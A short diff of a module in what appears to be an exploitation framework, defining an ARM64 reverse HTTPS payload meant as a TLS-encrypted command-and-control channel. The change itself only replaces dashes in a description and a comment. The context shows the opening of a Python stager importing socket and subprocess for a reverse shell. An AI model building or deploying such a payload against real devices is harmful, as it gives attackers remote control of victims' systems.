@@ -11,7 +11,7 @@ from embedxpl.core.exploit.payloads import BasePayload
 class Payload(BasePayload):
     __info__ = {
         "name": "ARM64 Reverse HTTPS",
-        "description": "Stage-1 reverse HTTPS payload for ARM64 — TLS encrypted C2 channel.",
+        "description": "Stage-1 reverse HTTPS payload for ARM64  -  TLS encrypted C2 channel.",
         "authors": ("André Henrique (@mrhenrike)", "União Geek"),
     }
 
@@ -27,7 +27,7 @@ class Payload(BasePayload):
         verify = self.options["VERIFY_CERT"]["value"].lower() == "true"
         verify_str = "True" if verify else "False"
 
-        # Python stager — compilável para ARM64 via PyInstaller + musl cross
+        # Python stager  -  compilável para ARM64 via PyInstaller + musl cross
         stager = f"""#!/usr/bin/env python3
 import ssl,socket,subprocess,os,sys
 ctx=ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
